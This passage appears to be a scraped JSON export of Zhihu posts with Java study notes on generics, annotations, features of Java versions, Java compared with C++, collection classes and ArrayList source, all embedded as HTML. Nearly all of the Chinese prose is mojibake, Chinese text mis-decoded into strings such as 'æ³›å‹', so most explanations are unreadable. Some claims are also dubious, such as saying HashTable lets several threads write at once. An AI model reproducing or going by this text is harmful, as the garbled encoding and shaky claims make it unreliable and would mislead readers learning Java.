class=\"nf\">set</span><span class=\"o\">(</span><span class=\"n\">T</span> <span class=\"n\">t</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">t</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span> <span class=\"o\">}</span>\n    <span class=\"kd\">public</span> <span class=\"n\">T</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span> <span class=\"k\">return</span> <span class=\"n\">t</span><span class=\"o\">;</span> <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><ul><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/24029.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java æ³›å‹è¯¦è§£</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/1033693\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">10 é“ Java æ³›å‹é¢è¯•é¢˜</a></li></ul><h2>åã€æ³¨è§£</h2><p>Java æ³¨è§£æ˜¯é™„åŠ åœ¨ä»£ç ä¸­çš„ä¸€äº›å…ƒä¿¡æ¯ï¼Œç”¨äºä¸€äº›å·¥å…·åœ¨ç¼–è¯‘ã€è¿è¡Œæ—¶è¿›è¡Œè§£æå’Œä½¿ç”¨ï¼Œèµ·åˆ°è¯´æ˜ã€é…ç½®çš„åŠŸèƒ½ã€‚æ³¨è§£ä¸ä¼šä¹Ÿä¸èƒ½å½±å“ä»£ç çš„å®é™…é€»è¾‘ï¼Œä»…ä»…èµ·åˆ°è¾…åŠ©æ€§çš„ä½œç”¨ã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/acm-bingzi/p/javaAnnotation.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ³¨è§£ Annotation å®ç°åŸç†ä¸è‡ªå®šä¹‰æ³¨è§£ä¾‹å­</a></p><h2>åä¸€ã€ç‰¹æ€§</h2><h2>Java å„ç‰ˆæœ¬çš„æ–°ç‰¹æ€§</h2><p><b>New highlights in Java SE 8</b> </p><ol><li>Lambda Expressions</li><li>Pipelines and Streams</li><li>Date and Time API</li><li>Default Methods</li><li>Type Annotations</li><li>Nashhorn JavaScript Engine</li><li>Concurrent Accumulators</li><li>Parallel operations</li><li>PermGen Error Removed</li></ol><p><b>New highlights in Java SE 7</b> </p><ol><li>Strings in Switch Statement</li><li>Type Inference for Generic Instance Creation</li><li>Multiple Exception Handling</li><li>Support for Dynamic Languages</li><li>Try with Resources</li><li>Java nio Package</li><li>Binary Literals, Underscore in literals</li><li> Diamond Syntax<br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.selfgrowth.com/articles/difference-between-java-18-and-java-17\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Difference between Java 1.8 and Java 1.7?</a><br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/19345.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java 8 ç‰¹æ€§</a></li></ol><h2>Java ä¸ C++ çš„åŒºåˆ«</h2><ul><li>Java æ˜¯çº¯ç²¹çš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿è‡ª java.lang.Objectï¼ŒC++ ä¸ºäº†å…¼å®¹ C å³æ”¯æŒé¢å‘å¯¹è±¡ä¹Ÿæ”¯æŒé¢å‘è¿‡ç¨‹ã€‚</li><li>Java é€šè¿‡è™šæ‹Ÿæœºä»è€Œå®ç°è·¨å¹³å°ç‰¹æ€§ï¼Œä½†æ˜¯ C++ ä¾èµ–äºç‰¹å®šçš„å¹³å°ã€‚</li><li>Java æ²¡æœ‰æŒ‡é’ˆï¼Œå®ƒçš„å¼•ç”¨å¯ä»¥ç†è§£ä¸ºå®‰å…¨æŒ‡é’ˆï¼Œè€Œ C++ å…·æœ‰å’Œ C ä¸€æ ·çš„æŒ‡é’ˆã€‚</li><li>Java æ”¯æŒè‡ªåŠ¨åƒåœ¾å›æ”¶ï¼Œè€Œ C++ éœ€è¦æ‰‹åŠ¨å›æ”¶ã€‚</li><li>Java ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œåªèƒ½é€šè¿‡å®ç°å¤šä¸ªæ¥å£æ¥è¾¾åˆ°ç›¸åŒç›®çš„ï¼Œè€Œ C++ æ”¯æŒå¤šé‡ç»§æ‰¿ã€‚</li><li>Java ä¸æ”¯æŒæ“ä½œç¬¦é‡è½½ï¼Œè™½ç„¶å¯ä»¥å¯¹ä¸¤ä¸ª String å¯¹è±¡æ‰§è¡ŒåŠ æ³•è¿ç®—ï¼Œä½†æ˜¯è¿™æ˜¯è¯­è¨€å†…ç½®æ”¯æŒçš„æ“ä½œï¼Œä¸å±äºæ“ä½œç¬¦é‡è½½ï¼Œè€Œ C++ å¯ä»¥ã€‚</li><li>Java çš„ goto æ˜¯ä¿ç•™å­—ï¼Œä½†æ˜¯ä¸å¯ç”¨ï¼ŒC++ å¯ä»¥ä½¿ç”¨ gotoã€‚</li><li>Java ä¸æ”¯æŒæ¡ä»¶ç¼–è¯‘ï¼ŒC++ é€šè¿‡ #ifdef #ifndef ç­‰é¢„å¤„ç†å‘½ä»¤ä»è€Œå®ç°æ¡ä»¶ç¼–è¯‘ã€‚</li></ul><p><a href=\"https://link.zhihu.com/?target=http%3A//cs-fundamentals.com/tech-interview/java/differences-between-java-and-cpp.php\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What are the main differences between Java and C++?</a></p><h2>JRE or JDK</h2><ul><li>JRE is the JVM program, Java application need to run on JRE.</li><li>JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler &#34;javac&#34;</li></ul><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Eckel B. Java ç¼–ç¨‹æ€æƒ³[M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002.</li><li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"355\" class=\"origin_image zh-lightbox-thumb\" width=\"868\" data-original=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;868&#39; height=&#39;355&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"355\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"868\" data-original=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-0cc31b487492e9104150995ef37f51ba_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/59850978", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 5, 
            "title": "Java å®¹å™¨", 
            "content": "<p>ä¸€ã€æ¦‚è§ˆ</p><p>å®¹å™¨ä¸»è¦åŒ…æ‹¬ Collection å’Œ Map ä¸¤ç§ï¼ŒCollection å­˜å‚¨ç€å¯¹è±¡çš„é›†åˆï¼Œè€Œ Map å­˜å‚¨ç€é”®å€¼å¯¹ï¼ˆä¸¤ä¸ªå¯¹è±¡ï¼‰çš„æ˜ å°„è¡¨ã€‚</p><h2>Collection</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-6d9ce14cd2c30bd6e9f9eacb2c4b8960_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1065\" data-rawheight=\"559\" class=\"origin_image zh-lightbox-thumb\" width=\"1065\" data-original=\"https://pic1.zhimg.com/v2-6d9ce14cd2c30bd6e9f9eacb2c4b8960_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1065&#39; height=&#39;559&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1065\" data-rawheight=\"559\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1065\" data-original=\"https://pic1.zhimg.com/v2-6d9ce14cd2c30bd6e9f9eacb2c4b8960_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-6d9ce14cd2c30bd6e9f9eacb2c4b8960_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>1. Set</h3><ul><li> TreeSetï¼šåŸºäºçº¢é»‘æ ‘å®ç°ï¼Œæ”¯æŒæœ‰åºæ€§æ“ä½œï¼Œä¾‹å¦‚æ ¹æ®ä¸€ä¸ªèŒƒå›´æŸ¥æ‰¾å…ƒç´ çš„æ“ä½œã€‚ä½†æ˜¯æŸ¥æ‰¾æ•ˆç‡ä¸å¦‚ HashSetï¼ŒHashSet æŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼ŒTreeSet åˆ™ä¸º O(logN)ã€‚<br/> </li><li> HashSetï¼šåŸºäºå“ˆå¸Œè¡¨å®ç°ï¼Œæ”¯æŒå¿«é€ŸæŸ¥æ‰¾ï¼Œä½†ä¸æ”¯æŒæœ‰åºæ€§æ“ä½œã€‚å¹¶ä¸”å¤±å»äº†å…ƒç´ çš„æ’å…¥é¡ºåºä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ Iterator éå† HashSet å¾—åˆ°çš„ç»“æœæ˜¯ä¸ç¡®å®šçš„ã€‚<br/> </li><li> LinkedHashSetï¼šå…·æœ‰ HashSet çš„æŸ¥æ‰¾æ•ˆç‡ï¼Œä¸”å†…éƒ¨ä½¿ç”¨åŒå‘é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ’å…¥é¡ºåºã€‚<br/> </li></ul><h3>2. List</h3><ul><li> ArrayListï¼šåŸºäºåŠ¨æ€æ•°ç»„å®ç°ï¼Œæ”¯æŒéšæœºè®¿é—®ã€‚<br/> </li><li> Vectorï¼šå’Œ ArrayList ç±»ä¼¼ï¼Œä½†å®ƒæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚<br/> </li><li> LinkedListï¼šåŸºäºåŒå‘é“¾è¡¨å®ç°ï¼Œåªèƒ½é¡ºåºè®¿é—®ï¼Œä½†æ˜¯å¯ä»¥å¿«é€Ÿåœ°åœ¨é“¾è¡¨ä¸­é—´æ’å…¥å’Œåˆ é™¤å…ƒç´ ã€‚ä¸ä»…å¦‚æ­¤ï¼ŒLinkedList è¿˜å¯ä»¥ç”¨ä½œæ ˆã€é˜Ÿåˆ—å’ŒåŒå‘é˜Ÿåˆ—ã€‚<br/> </li></ul><h3>3. Queue</h3><ul><li> LinkedListï¼šå¯ä»¥ç”¨å®ƒæ¥å®ç°åŒå‘é˜Ÿåˆ—ã€‚<br/> </li><li> PriorityQueueï¼šåŸºäºå †ç»“æ„å®ç°ï¼Œå¯ä»¥ç”¨å®ƒæ¥å®ç°ä¼˜å…ˆé˜Ÿåˆ—ã€‚<br/> </li></ul><h2>Map</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-ea9e21c672612414526ef1dea07b24e4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"775\" data-rawheight=\"482\" class=\"origin_image zh-lightbox-thumb\" width=\"775\" data-original=\"https://pic1.zhimg.com/v2-ea9e21c672612414526ef1dea07b24e4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;775&#39; height=&#39;482&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"775\" data-rawheight=\"482\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"775\" data-original=\"https://pic1.zhimg.com/v2-ea9e21c672612414526ef1dea07b24e4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-ea9e21c672612414526ef1dea07b24e4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li> TreeMapï¼šåŸºäºçº¢é»‘æ ‘å®ç°ã€‚<br/> </li><li> HashMapï¼šåŸºäºå“ˆå¸Œè¡¨å®ç°ã€‚<br/> </li><li> HashTableï¼šå’Œ HashMap ç±»ä¼¼ï¼Œä½†å®ƒæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œè¿™æ„å‘³ç€åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶å†™å…¥ HashTable å¹¶ä¸”ä¸ä¼šå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚å®ƒæ˜¯é—ç•™ç±»ï¼Œä¸åº”è¯¥å»ä½¿ç”¨å®ƒã€‚ç°åœ¨å¯ä»¥ä½¿ç”¨ ConcurrentHashMap æ¥æ”¯æŒçº¿ç¨‹å®‰å…¨ï¼Œå¹¶ä¸” ConcurrentHashMap çš„æ•ˆç‡ä¼šæ›´é«˜ï¼Œå› ä¸º ConcurrentHashMap å¼•å…¥äº†åˆ†æ®µé”ã€‚<br/> </li><li> LinkedHashMapï¼šä½¿ç”¨åŒå‘é“¾è¡¨æ¥ç»´æŠ¤å…ƒç´ çš„é¡ºåºï¼Œé¡ºåºä¸ºæ’å…¥é¡ºåºæˆ–è€…æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰é¡ºåºã€‚<br/> </li></ul><h2>äºŒã€å®¹å™¨ä¸­çš„è®¾è®¡æ¨¡å¼</h2><h2>è¿­ä»£å™¨æ¨¡å¼</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-7b03112dd4dd4d990a3f0c94434a8b89_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"443\" class=\"origin_image zh-lightbox-thumb\" width=\"855\" data-original=\"https://pic2.zhimg.com/v2-7b03112dd4dd4d990a3f0c94434a8b89_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;855&#39; height=&#39;443&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"443\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"855\" data-original=\"https://pic2.zhimg.com/v2-7b03112dd4dd4d990a3f0c94434a8b89_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-7b03112dd4dd4d990a3f0c94434a8b89_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>Collection ç»§æ‰¿äº† Iterable æ¥å£ï¼Œå…¶ä¸­çš„ iterator() æ–¹æ³•èƒ½å¤Ÿäº§ç”Ÿä¸€ä¸ª Iterator å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è¿­ä»£éå† Collection ä¸­çš„å…ƒç´ ã€‚</p><p>ä» JDK 1.5 ä¹‹åå¯ä»¥ä½¿ç”¨ foreach æ–¹æ³•æ¥éå†å®ç°äº† Iterable æ¥å£çš„èšåˆå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"s\">&#34;a&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"s\">&#34;b&#34;</span><span class=\"o\">);</span>\n<span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">item</span> <span class=\"o\">:</span> <span class=\"n\">list</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">item</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>é€‚é…å™¨æ¨¡å¼</h2><p>java.util.Arrays#asList() å¯ä»¥æŠŠæ•°ç»„ç±»å‹è½¬æ¢ä¸º List ç±»å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"nd\">@SafeVarargs</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"o\">&lt;</span><span class=\"n\">T</span><span class=\"o\">&gt;</span> <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">T</span><span class=\"o\">&gt;</span> <span class=\"nf\">asList</span><span class=\"o\">(</span><span class=\"n\">T</span><span class=\"o\">...</span> <span class=\"n\">a</span><span class=\"o\">)</span></code></pre></div><p>åº”è¯¥æ³¨æ„çš„æ˜¯ asList() çš„å‚æ•°ä¸ºæ³›å‹çš„å˜é•¿å‚æ•°ï¼Œä¸èƒ½ä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œåªèƒ½ä½¿ç”¨ç›¸åº”çš„åŒ…è£…ç±»å‹æ•°ç»„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span><span class=\"o\">[]</span> <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"o\">{</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">3</span><span class=\"o\">};</span>\n<span class=\"n\">List</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">asList</span><span class=\"o\">(</span><span class=\"n\">arr</span><span class=\"o\">);</span></code></pre></div><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è°ƒç”¨ asList()ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">List</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">asList</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">3</span><span class=\"o\">);</span></code></pre></div><h2>ä¸‰ã€æºç åˆ†æ</h2><p>å¦‚æœæ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œä»¥ä¸‹æºç åˆ†æåŸºäº JDK 1.8ã€‚</p><p>åœ¨ IDEA ä¸­ double shift è°ƒå‡º Search EveryWhereï¼ŒæŸ¥æ‰¾æºç æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¹‹åå°±å¯ä»¥é˜…è¯»æºç ã€‚</p><h2>ArrayList</h2><h3>1. æ¦‚è§ˆ</h3><p>å› ä¸º ArrayList æ˜¯åŸºäºæ•°ç»„å®ç°çš„ï¼Œæ‰€ä»¥æ”¯æŒå¿«é€Ÿéšæœºè®¿é—®ã€‚RandomAccess æ¥å£æ ‡è¯†ç€è¯¥ç±»æ”¯æŒå¿«é€Ÿéšæœºè®¿é—®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">AbstractList</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span>\n        <span class=\"kd\">implements</span> <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;,</span> <span class=\"n\">RandomAccess</span><span class=\"o\">,</span> <span class=\"n\">Cloneable</span><span class=\"o\">,</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">Serializable</span></code></pre></div><p>æ•°ç»„çš„é»˜è®¤å¤§å°ä¸º 10ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">DEFAULT_CAPACITY</span> <span class=\"o\">=</span> <span class=\"n\">10</span><span class=\"o\">;</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-b6d1cffbc09eb43915ae57fbf7984319_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"612\" data-rawheight=\"180\" class=\"origin_image zh-lightbox-thumb\" width=\"612\" data-original=\"https://pic2.zhimg.com/v2-b6d1cffbc09eb43915ae57fbf7984319_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;612&#39; height=&#39;180&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"612\" data-rawheight=\"180\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"612\" data-original=\"https://pic2.zhimg.com/v2-b6d1cffbc09eb43915ae57fbf7984319_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-b6d1cffbc09eb43915ae57fbf7984319_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. æ‰©å®¹</h3><p>æ·»åŠ å…ƒç´ æ—¶ä½¿ç”¨ ensureCapacityInternal() æ–¹æ³•æ¥ä¿è¯å®¹é‡è¶³å¤Ÿï¼Œå¦‚æœä¸å¤Ÿæ—¶ï¼Œéœ€è¦ä½¿ç”¨ grow() æ–¹æ³•è¿›è¡Œæ‰©å®¹ï¼Œæ–°å®¹é‡çš„å¤§å°ä¸º <code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>ï¼Œä¹Ÿå°±æ˜¯æ—§å®¹é‡çš„ 1.5 å€ã€‚</p><p>æ‰©å®¹æ“ä½œéœ€è¦è°ƒç”¨ <code>Arrays.copyOf()</code> æŠŠåŸæ•°ç»„æ•´ä¸ªå¤åˆ¶åˆ°æ–°æ•°ç»„ä¸­ï¼Œè¿™ä¸ªæ“ä½œä»£ä»·å¾ˆé«˜ï¼Œå› æ­¤æœ€å¥½åœ¨åˆ›å»º ArrayList å¯¹è±¡æ—¶å°±æŒ‡å®šå¤§æ¦‚çš„å®¹é‡å¤§å°ï¼Œå‡å°‘æ‰©å®¹æ“ä½œçš„æ¬¡æ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">add</span><span class=\"o\">(</span><span class=\"n\">E</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ensureCapacityInternal</span><span class=\"o\">(</span><span class=\"n\">size</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>  <span class=\"c1\">// Increments modCount!!\n</span><span class=\"c1\"></span>    <span class=\"n\">elementData</span><span class=\"o\">[</span><span class=\"n\">size</span><span class=\"o\">++]</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">ensureCapacityInternal</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">minCapacity</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">elementData</span> <span class=\"o\">==</span> <span class=\"n\">DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">minCapacity</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">DEFAULT_CAPACITY</span><span class=\"o\">,</span> <span class=\"n\">minCapacity</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">ensureExplicitCapacity</span><span class=\"o\">(</span><span class=\"n\">minCapacity</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">ensureExplicitCapacity</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">minCapacity</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">modCount</span><span class=\"o\">++;</span>\n    <span class=\"c1\">// overflow-conscious code\n</span><span class=\"c1\"></span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">minCapacity</span> <span class=\"o\">-</span> <span class=\"n\">elementData</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">grow</span><span class=\"o\">(</span><span class=\"n\">minCapacity</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">grow</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">minCapacity</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// overflow-conscious code\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">oldCapacity</span> <span class=\"o\">=</span> <span class=\"n\">elementData</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">newCapacity</span> <span class=\"o\">=</span> <span class=\"n\">oldCapacity</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">oldCapacity</span> <span class=\"o\">&gt;&gt;</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">newCapacity</span> <span class=\"o\">-</span> <span class=\"n\">minCapacity</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">newCapacity</span> <span class=\"o\">=</span> <span class=\"n\">minCapacity</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">newCapacity</span> <span class=\"o\">-</span> <span class=\"n\">MAX_ARRAY_SIZE</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">newCapacity</span> <span class=\"o\">=</span> <span class=\"n\">hugeCapacity</span><span class=\"o\">(</span><span class=\"n\">minCapacity</span><span class=\"o\">);</span>\n    <span class=\"c1\">// minCapacity is usually close to size, so this is a win:\n</span><span class=\"c1\"></span>    <span class=\"n\">elementData</span> <span class=\"o\">=</span> <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">copyOf</span><span class=\"o\">(</span><span class=\"n\">elementData</span><span class=\"o\">,</span> <span class=\"n\">newCapacity</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h3>3. åˆ é™¤å…ƒç´ </h3><p>éœ€è¦è°ƒç”¨ System.arraycopy() å°† index+1 åé¢çš„å…ƒç´ éƒ½å¤åˆ¶åˆ° index ä½ç½®ä¸Šï¼Œè¯¥æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º O(N)ï¼Œå¯ä»¥çœ‹å‡º ArrayList åˆ é™¤å…ƒç´ çš„ä»£ä»·æ˜¯éå¸¸é«˜çš„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">E</span> <span class=\"nf\">remove</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">rangeCheck</span><span class=\"o\">(</span><span class=\"n\">index</span><span class=\"o\">);</span>\n    <span class=\"n\">modCount</span><span class=\"o\">++;</span>\n    <span class=\"n\">E</span> <span class=\"n\">oldValue</span> <span class=\"o\">=</span> <span class=\"n\">elementData</span><span class=\"o\">(</span><span class=\"n\">index</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">numMoved</span> <span class=\"o\">=</span> <span class=\"n\">size</span> <span class=\"o\">-</span> <span class=\"n\">index</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">numMoved</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">arraycopy</span><span class=\"o\">(</span><span class=\"n\">elementData</span><span class=\"o\">,</span> <span class=\"n\">index</span><span class=\"o\">+</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">elementData</span><span class=\"o\">,</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"n\">numMoved</span><span class=\"o\">);</span>\n    <span class=\"n\">elementData</span><span class=\"o\">[--</span><span 